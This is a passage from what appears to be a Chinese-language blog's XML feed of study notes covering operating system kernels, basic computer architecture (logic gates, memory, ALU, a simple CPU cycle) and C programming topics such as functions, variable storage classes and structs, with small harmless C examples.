title="操作系统"></a>操作系统</h2><blockquote><p>想让电脑执行程序，就得要参考一堆硬件功能的函数，还要学习机器语言，并且每次写程序都有重新改写，如果将所有的硬件都驱动，提供一个软件的参考接口开发软件，就好多了，这就是操作系统</p></blockquote><h3 id="内核-Kernel"><a href="#内核-Kernel" class="headerlink" title="内核(Kernel)"></a>内核(<code>Kernel</code>)</h3><ul><li>OS也是一组程序，这组程序的重点是可以管理电脑的所有活动和驱动系统中的所有硬件<ul><li>比如让CPU逻辑判断和计算</li><li>内存读写代码</li><li>让网卡传输数据等</li></ul></li><li>实现上述的功能就是操作系统的内核</li></ul><h3 id="系统调用-System-Call"><a href="#系统调用-System-Call" class="headerlink" title="系统调用(System Call)"></a>系统调用(<code>System Call</code>)</h3><p>​        硬件都由内核管理后，开发软件还要去参考内核的功能，还是很麻烦</p><ul><li>于是OS会提供一套应用程序的编程接口(<code>Application Programing Interface</code>)，用来给程序员开发，就比如学习C语言只需要学习C的函数就行了，然后系统调用会直接将C的相关语法转换为内核可以看懂的任务函数</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/kernel.png" alt=""></p><p>图中的概念</p><ul><li>因为内核是参考硬件规格做的，所有同一系统不能在不同硬件结构下执行，例如windows不能在<code>ARM</code>下运行</li><li>OS只是管理整个资源，CPU、内存、输入输出设备、文件系统等</li><li>应用程序是参考API写的，所以不同操作系统不能运行</li></ul><h3 id="内核功能"><a href="#内核功能" class="headerlink" title="内核功能"></a>内核功能</h3><ul><li><p>系统调用接口(<code>System call interface</code>)</p><p>方便程序员与内核的沟通</p></li><li><p>进程管理(<code>Process control</code>)</p><p>分配多个任务给CPU时，可以有效的加快性能</p></li><li><p>内存管理(<code>Memory management</code>)</p><p>因为程序代码和数据都是放在内存中的，内核一般会提供虚拟内存的功能，内存不足会提供交换<code>(swap)</code>分区的功能</p></li><li><p>文件系统管理(<code>Filesystem management</code>)</p><p>文件系统的管理，例如数据的输入输出等工作，还有不同文件格式的支持等，如果你的内核不支持某各文件系统，你就无法使用这个格式的文件</p></li><li><p>设备驱动(<code>Device drivers</code>)</p><p>用来管理硬件</p></li></ul><h2 id="操作系统与驱动"><a href="#操作系统与驱动" class="headerlink" title="操作系统与驱动"></a>操作系统与驱动</h2><ul><li>OS要能够驱动硬件，应用程序才能使用硬件功能</li><li>一般来说，操作系统会提供<code>API</code>给开发商编写驱动</li><li>驱动由厂家提供</li></ul><blockquote><p>参考《鸟哥的Linux私房菜 基础学习篇》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机内部 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPU </tag>
            
            <tag> 内存 </tag>
            
            <tag> 接口 </tag>
            
            <tag> 硬盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基本科学</title>
      <link href="/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6.html"/>
      <url>/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6.html</url>
      
        <content type="html"><![CDATA[<p>注：以下内容包括图片均截取自 Youtube <a href="https://www.youtube.com/playlist?list=PL8dPuuaLjXtNlUrzyH5r6jN9ulI">Crash Course的视频</a>，若有侵权请联系我</p><span id="more"></span><h2 id="计算机发展历史"><a href="#计算机发展历史" class="headerlink" title="计算机发展历史"></a>计算机发展历史</h2><ol><li>为了减少人类工作量，出现算盘</li><li>然后有了<code>步进计算器</code>（原理就是数个齿轮，每个有十个齿，表示0-9，每加到9时，再加1会到0，前面的齿轮+1，就像算盘，减法相反，乘除不过是多个加减），可以做加减乘除</li><li><code>computer</code>最开始是指计算的人，后来才指机器</li><li>因为计算机可以减少很多人力物力，然后计算机高速发展</li></ol><h2 id="电子计算机"><a href="#电子计算机" class="headerlink" title="电子计算机"></a>电子计算机</h2><h3 id="机电"><a href="#机电" class="headerlink" title="机电"></a><strong>机电</strong></h3><ol><li>早期使用机械继电器连接电路， 比如控制马达，使齿轮+1（每秒50次）</li><li>缺点：因为是机械，所以有延迟，磨损。</li><li>要排除故障太费力，还会吸引臭虫（<code>bug</code>）</li></ol><h3 id="热电子管（玻璃）"><a href="#热电子管（玻璃）" class="headerlink" title="热电子管（玻璃）"></a><strong>热电子管（玻璃）</strong></h3><ol><li>二极管（<code>单向流动</code>）： 一极加热放出电子，另一极吸引正电子（<code>电流</code>）；</li><li>三极管：在二极管的基础上加一个控制电极，施加正电允许电子流动，负电阻止电子流动（与继电器功能一样，断开和闭合电路，但没有磨损） 。</li><li>缺点：成本高， 会向灯泡一样被烧坏；</li></ol><h3 id="晶体管（固态）"><a href="#晶体管（固态）" class="headerlink" title="晶体管（固态）"></a><strong>晶体管（固态）</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E6%99%B6%E4%BD%93%E7%AE%A1.png" alt=""></p><ol><li>中间是半导体，可以控制半导体的导电性来控制电流。</li><li>每秒10000次；</li><li>体积更小，因为是固体，所以相对于热电子管更经用；（现在晶体管的小于50nm，而一张纸的厚度是10,000nm，每秒几百万次，工作时间更耐久）</li><li>后来采用二进制进行计算</li></ol><h2 id="布尔逻辑和逻辑门"><a href="#布尔逻辑和逻辑门" class="headerlink" title="布尔逻辑和逻辑门"></a>布尔逻辑和逻辑门</h2><ol><li>使用两种状态就可以表示所有东西了。 </li><li>晶体管不仅可以开和关， 还可以让不同大小的电流通过，早期的计算机有三进制和五进制，但是进制越多越难区分信号（<code>被干扰</code>）</li><li>早期数学已经开始研究二进制了，已经解决了所有运算法则（<code>布尔代数</code>）</li></ol><p><strong>三个基本布尔操作</strong> </p><p><code>NOT</code>：将布尔值反转</p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/NOT.png" alt=""></p><p><code>AND</code>：有false则output为false（将晶体管串联实现）</p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/and.png" alt=""></p><p><code>OR</code>：有true则为true</p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/OR.png" alt=""></p><p><code>XOR</code>：相同则为false；不同为true</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/xor.png" alt=""></p><h2 id="寄存器和内存"><a href="#寄存器和内存" class="headerlink" title="寄存器和内存"></a>寄存器和内存</h2><p>因为使用ALU计算后的数值需要存起来，于是有了内存。</p><p><strong>RAM</strong>（<code>Random Access Memory</code>随机存取存储器）：</p><ul><li>只在通电时数据是保留的 </li></ul><h3 id="锁存器"><a href="#锁存器" class="headerlink" title="锁存器"></a><strong>锁存器</strong></h3><ul><li>可以记录一位信息</li></ul><div class="img-x">    <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/AND-OR-latch.png" alt="1" style="zoom:100%;" /> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/门锁.png" alt="2" style="zoom:100%;" /></div>    <h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a><strong>寄存器</strong></h3><ul><li><p>并排存放的一组锁存器</p></li><li><p>寄存器能存一个数字，这个数字有多少位叫<code>位宽</code></p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/8%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8.png" alt=""></p></li><li><p><strong>Memory</strong></p><ul><li>因为要存更多数据，并排存放的话需要很多数据线，此时需要用矩阵</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E7%9F%A9%E9%98%B51.png" alt="矩阵1"></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E7%9F%A9%E9%98%B52.png" alt="矩阵2">  ​   </p><ul><li><p>那如何确定一个地址呢：</p><ul><li><p>使用“多路复用器（<code>Multplexers</code>）”</p></li><li><p>原理（将行和列转化位8位二进制）</p><p>  <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%99%A8.png" alt=""></p></li></ul></li></ul><p>抽象化</p><p><strong>256-bit-memory</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/256-bit-memory.png" alt=""></p><p><strong>256-byte-memory</strong></p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/256-byte-memory.png" alt=""></p><p>可以将上面整体看成一个可寻址内存（RAM）：</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/addressable.png" alt=""></p><p>以上内存是一个静态内存<code>SRAM</code>,现在有<code>DRAM</code>等很多</p><h2 id="ALU"><a href="#ALU" class="headerlink" title="ALU"></a>ALU</h2><p>在CPU里面，ALU主要负责计算和判断</p><h3 id="算术单元（arithmetic）"><a href="#算术单元（arithmetic）" class="headerlink" title="算术单元（arithmetic）"></a>算术单元（arithmetic）</h3><p>负责加减</p><ul><li><strong>半加器</strong>（<code>Half adder</code>）<ul><li>功能：输入两个bit，输出两个的<strong>和（<code>SUM</code>）</strong>及<strong>进位（<code>CARRY</code>）</strong></li><li>实现：</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E5%8D%8A%E5%8A%A0%E5%99%A8.png" alt=""></p><ul><li><strong>全加器</strong>（<code>Full adder</code>）<ul><li>功能：三个输入bit，同样输出<code>sum</code>与<code>carry</code></li><li>实现电路：</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/Fulladder.png" alt=""></p><p>例子（8位行波进位加法器）</p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/8bitadder.png" alt=""></p><p>超出所表示位数表示“溢出”，后果很严重。</p><p>ps：现在使用<strong>超前进位加法器</strong></p><h3 id="逻辑单元（logic）"><a href="#逻辑单元（logic）" class="headerlink" title="逻辑单元（logic）"></a>逻辑单元（logic）</h3><ul><li><p>用来执行一些逻辑操作，比如AND OR NOT等，还有判断是否为负数，是否为0等</p><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA0.png" alt=""></p></li></ul><p>抽象化：</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/alu.png" alt=""></p><h2 id="自建CPU"><a href="#自建CPU" class="headerlink" title="自建CPU"></a>自建CPU</h2><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><ul><li><p>需要RAM</p></li><li><p><em>假设</em>一个操作码（<code>opcode</code>）</p><p>前四位：</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/opcode.png" alt=""></p></li></ul><p>​    后四位表示<code>地址</code></p><ul><li>所需寄存器<ul><li><strong>指令地址寄存器</strong>：追踪程序运行到哪里，存当前指令的内存地址</li><li><strong>指令寄存器</strong>：存当前指令</li></ul></li><li>启动计算机时，寄存器从<strong>0</strong>开始</li></ul><h3 id="CPU工作阶段"><a href="#CPU工作阶段" class="headerlink" title="CPU工作阶段"></a>CPU工作阶段</h3><h4 id="FETCH-PHASE"><a href="#FETCH-PHASE" class="headerlink" title="FETCH PHASE"></a>FETCH PHASE</h4><ul><li><p>取指令阶段</p></li><li><p>将指令地址寄存器连接到<code>RAM</code>，寄存器的值为0，RAM返回地址0的值</p></li><li><p>将值给<em>指令寄存器</em></p></li></ul><h4 id="DECODE-PHASE"><a href="#DECODE-PHASE" class="headerlink" title="DECODE PHASE"></a>DECODE PHASE</h4><ul><li>解码阶段</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E8%A7%A3%E7%A0%81.png" alt=""></p><ul><li>识别操作码电路</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E8%AF%86%E5%88%AB%E6%93%8D%E4%BD%9C%E7%A0%81.png" alt=""></p><h4 id="EXECUTE-PHASE"><a href="#EXECUTE-PHASE" class="headerlink" title="EXECUTE PHASE"></a>EXECUTE PHASE</h4><ul><li>执行阶段</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5.png" alt=""></p><ul><li>操作码正确可以打开RAM的<strong>允许读取线</strong></li><li>这里说的是将地址14的数据放入寄存器A（<code>RAM需要连接所有寄存器</code>）</li><li>这个阶段完成，指令地址寄存器+1</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机内部 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPU </tag>
            
            <tag> 内存 </tag>
            
            <tag> 汇编 </tag>
            
            <tag> ALU </tag>
            
            <tag> 寄存器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单理解函数</title>
      <link href="/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E5%87%BD%E6%95%B0.html"/>
      <url>/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E5%87%BD%E6%95%B0.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>c对类型的检查并不严谨<br>emmm形参实参我哭了。。。tm直接叫参数不好吗</p><p>没指针的函数只有参数值的传递，不能改变原有参数的值</p><p><code>=</code>左边是左值，因为是运算</p><p>C语言通过调用函数来实现功能</p></blockquote><span id="more"></span><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h3><p>由C语言提供，使用时只需要程序前<strong>包含函数的头文件</strong>即可</p><h3 id="用户定义函数"><a href="#用户定义函数" class="headerlink" title="用户定义函数"></a>用户定义函数</h3><p>用户自己定义函数，要在函数中定义函数本身， 在主函数调用中还必须对被调函数进行类型说明，才能使用.</p><h4 id="有返回值的函数"><a href="#有返回值的函数" class="headerlink" title="有返回值的函数"></a>有返回值的函数</h4><p>此类函数调用后向调用者返回一个执行结果，必须定义类型.</p><h4 id="无返回值函数"><a href="#无返回值函数" class="headerlink" title="无返回值函数"></a>无返回值函数</h4><p>并非真的没有，只是只关心处理过程而已，无返回值时可定义返回类型为空(<code>void</code>)，或者不写</p><h4 id="无参函数"><a href="#无参函数" class="headerlink" title="无参函数"></a>无参函数</h4><p>函数定义、说明、调用均不带参数，主调函数和被调函数之间不进行函数传送，一般这类函数用于完成指定功能，可以返回（<code>return</code>）或者不返回函数值.</p><h4 id="有参函数"><a href="#有参函数" class="headerlink" title="有参函数"></a>有参函数</h4><p>函数定义和说明中有参数.</p><p>说明:</p><ul><li>规定了传输数据的类型和数量</li><li>定义时不给他分配空，只有在使用时才临时给他分配，结束即释放</li><li>参数可以是变量，表达式，常量，函数等，在使用时必须有确定的值</li><li>与使用的参数在数量，类型，顺序上必须保持一致</li></ul><h4 id="返回指针的函数"><a href="#返回指针的函数" class="headerlink" title="返回指针的函数"></a>返回指针的函数</h4><ul><li><p>返回本地变量的地址是危险的</p></li><li><p>返回全局变量和静态变量的地址是安全的(虽然安全，但不推荐使用，或者尽量避免使用来传递参数)</p></li><li><p>返回在函数内的<code>malloc</code>是安全的，但容易造成问题</p></li><li><p>最好的做法就是返回传入的指针</p></li></ul><blockquote><p>使用全局变量和静态本地变量的函数是线程不安全的</p></blockquote><h3 id="函数注意事项"><a href="#函数注意事项" class="headerlink" title="函数注意事项"></a>函数注意事项</h3><p>c语言中所有函数都是平行的，即在一个函数体内不能定义另一个函数</p><p>但允许函数之间相互调用，嵌套调用</p><p>但<code>main</code>不允许被其他函数地调用，且c语言只允许有一个<code>main</code></p><h2 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h2><p><code>函数类型 函数名(参数及其类型)</code><br><code>&#123;</code><br>       <code>函数变量说明;</code><br>       <code>语句;</code><br><code>&#125;</code></p><p>⑴不关心类型可定义为<code>void</code></p><p>⑵命名要满足标识符</p><p>⑶定义时参数必须有类型，看情况要不要参数</p><p>⑷可以没有参数，但括号不能省（与变量区分）</p><h2 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h2><ul><li>旧标准放在主函数里面，新标准可以放在主函数外面</li></ul><p><code>函数类型 函数名([参数表]);</code></p><p>说明:</p><p>①声明时，可以不写参数，但类型必须写.</p><p>②<code>#include</code>也是调用函数，使用<code>&lt;&gt;</code>时，指定系统会首先查找C编译的头文件路径，使用<code>&quot;&quot;</code>时，会首先查找当前目录.</p><p>③定义是创造，声明是引用.</p><p>④<code>int</code>型和<code>char</code>在定义时可不写类型，系统默认<code>int</code>型</p><p>⑤当定义在主调函数前面时可不声明，当返回值为<code>int</code>和<code>char</code>时，也可不声明</p><ul><li>函数调用一般形式：</li></ul><p><code>函数名(参数表)</code></p><ul><li><p>无参函数没有参数表, 各参之间用逗号隔开</p></li><li><p>引用的参数和定义的参数必须一一匹配</p></li><li><p>允许自己调用自己，叫<strong>递归调用</strong>.</p></li><li><p>函数调用只能返回值</p></li></ul><h2 id="变量类型和作用域"><a href="#变量类型和作用域" class="headerlink" title="变量类型和作用域"></a>变量类型和作用域</h2><p><code>printf(&quot;%s&quot;,_func_);</code>可以得到所在函数名</p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><ul><li>也叫内部变量，只作用与内部，也就是定义的地方内，在复合语句定义的变量，只在他的范围内有效.</li></ul><ol><li>参也属于局部变量</li><li>不同的函数可以使用相同的变量，他们互不干扰</li><li>只有被调用时才会被分配储存单元，用完就释放</li></ol><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul><li>也叫外部变量，在函数外部定义的变量，作用于整个源程序，但只有经过声明(<code>extern</code>)才能使用，在函数之前定义的变量可以不用声明.</li></ul><ol><li>有效范围从定义位置到文件结束</li><li>若全局变量和局部变量同名，在局部变量的作用域里，全局变量失效.</li><li>定义在外部，与任何函数无关</li><li>任何函数都可以使用它</li></ol><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul><li>全局变量默认是0</li><li>指针默认<code>NULL</code></li><li>只能用编译时刻已知的值来初始化全局变量</li><li>初始化发生在<code>main</code>之前</li></ul><h2 id="变量的储存方式"><a href="#变量的储存方式" class="headerlink" title="变量的储存方式"></a>变量的储存方式</h2><ul><li><p>全局和局部是由变量的定义域来划分的</p></li><li><p>若从变量存在的时间长短来划分，可分为动态储存变量和静态储存变量，也就是说，变量的生存期取</p><p>于变量的储存方式.</p></li></ul><h3 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h3><h4 id="auto自动变量"><a href="#auto自动变量" class="headerlink" title="auto自动变量"></a><code>auto</code>自动变量</h4><p>❶未加储存类型说明的默认<code>auto</code></p><p>❷属于局部变量，作用域仅限于变量个体内(因此不同函数使用相同的变量不会混淆)</p><p>❸属于动态储存方式，只有被调用时才会被分配储存单元，调用结束即释放，结束后，自动变量的值不会被保留.</p><p>❹默认数据不定</p><h4 id="register寄存器变量"><a href="#register寄存器变量" class="headerlink" title="register寄存器变量"></a><code>register</code>寄存器变量</h4><p>❶采用寄存器型存储(存在<code>CPU</code>的寄存器内)的变量，叫寄存器变量，可以提高访问效率</p><p>❷其他类变量都是放在内存储器内，需要反复访问内存储器，效率不高</p><h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><h4 id="extern-外部变量"><a href="#extern-外部变量" class="headerlink" title="extern 外部变量"></a><code>extern</code> 外部变量</h4><p>❶也叫全局变量</p><p>❷定义，在声明之后编译系统不会为他分配内存空间</p><h4 id="static静态变量"><a href="#static静态变量" class="headerlink" title="static静态变量"></a><code>static</code>静态变量</h4><p>❶相对于自动变量的生存期，静态局部变量始终存在，生存期为整个源程序.</p><p>❷作用域和自动变量一样，退出后，尽管变量依旧存在，但不能使用他，再次调用可继续使用，而且保留了上次使用后的值</p><p>❸默认0</p><h4 id="静态全局变量"><a href="#静态全局变量" class="headerlink" title="静态全局变量"></a>静态全局变量</h4><ul><li><p>只在这个<code>.c</code>文件里有效</p></li><li><p>即在外部变量前加<code>static</code>，区别就是静态的限制了作用域，静态的在各个源文件都是有效的，静态只在定义的源</p></li><li><p>文件内有效，可以避免在其他源文件中引起错误.</p></li><li><p>因此，变量说明的完整形式为</p></li></ul><p><code>储存类型说明符 数据类型说明符 变量名;</code></p><p>特殊的地方就是有着全局的生存期，是函数内部的作用域</p><p>本地变量的一些规则：</p><ul><li>是定义在块内的（一对大括号）</li><li>函数进入块之前，其中的变量不存在，离开后消失</li><li>块里的函数名与外面的变量同名会掩盖外面的</li></ul><blockquote><p>静态变量其实就是特殊的全局变量</p><ul><li>他们位于相同的内存区域 </li><li>特殊的地方就是有着全局的生存期，是函数内部的作用域</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;c=%p\n&quot;</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a=%p\n&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;b=%p\n&quot;</span>, &amp;b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到全局变量和静态变量的地址差<code>4(int)</code></p><h2 id="main里面的参数"><a href="#main里面的参数" class="headerlink" title="main里面的参数"></a>main里面的参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些参数值是从操作系统的命令行中得到</p><p><code>argc</code> 整数</p><p><code>argv</code>  字符串 </p><p><code>argv[0]</code>是你执行的名字</p><p><code>argv[1]</code>是你后面输入的指令</p><p>可以用来搞快捷方式</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单理解结构</title>
      <link href="/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%BB%93%E6%9E%84.html"/>
      <url>/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%BB%93%E6%9E%84.html</url>
      
        <content type="html"><![CDATA[<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>为了让一组数据有联系</li><li>可以在函数内定义，也可以在函数外面，在外面可以多个函数引用</li></ul><span id="more"></span><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>类型定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  结构体名</span></span><br><span class="line"><span class="class">&#123;</span>    </span><br><span class="line">成员列表<span class="comment">//由若干成员组成</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>成员定义</li></ul><p><code>类型说明符 成员名;</code> </p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li>变量的定义</li></ul><p>⑴先定义类型，再定义变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> mun;</span><br><span class="line"><span class="keyword">char</span> name;</span><br><span class="line"><span class="keyword">char</span> sex;</span><br><span class="line"><span class="keyword">float</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stu</span>  <span class="title">boy1</span>,<span class="title">boy2</span>;</span></span><br></pre></td></tr></table></figure><p>⑵在定义类型的同时定义变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span>  mun;</span><br><span class="line"><span class="keyword">char</span>  name;</span><br><span class="line"><span class="keyword">char</span>  sex;</span><br><span class="line"><span class="keyword">float</span>  score;</span><br><span class="line">&#125;boy1,boy2;</span><br></pre></td></tr></table></figure><p>⑶直接定义结构体变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span>  mun;</span><br><span class="line"><span class="keyword">char</span>  name;</span><br><span class="line"><span class="keyword">char</span>  sex;</span><br><span class="line"><span class="keyword">float</span>  score;</span><br><span class="line">&#125;boy1,boy2;</span><br></pre></td></tr></table></figure><ul><li>说明:<ul><li>使用<code>typedef</code>更好定义，也更简洁</li><li><code>⑵</code>与<code>⑶</code>的区别就是<code>⑶</code>没有结构体名，直接是变量</li><li>一个结构体类型所占的字节<strong>并不是所有类型的字节加起来</strong>，(使用<code>sizeof(struct 结构体名)</code>可以查看)因为读取效率问题，所以编译器会<strong>默认数据对齐</strong> </li><li>结构体可以<strong>嵌套使用</strong></li><li>结构体是用户定义的，不是唯一的</li><li>只有<strong>说明变量</strong>系统才会<strong>分配空间</strong></li><li><strong>结构体指针变量</strong>同样可以这样定义</li></ul></li></ul><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><ul><li>结构体和数组不一样，没有首地址这种说法，要想得到地址必须使用<code>&amp;</code></li></ul><h2 id="结构体的初始化"><a href="#结构体的初始化" class="headerlink" title="结构体的初始化"></a>结构体的初始化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//methods a:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">today</span> =</span> &#123;<span class="number">11</span>, <span class="number">13</span>, <span class="number">2019</span>&#125;;</span><br><span class="line"><span class="comment">//methods b:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date</span> <span class="title">thismonth</span> =</span> &#123;.month=<span class="number">11</span>, .year=<span 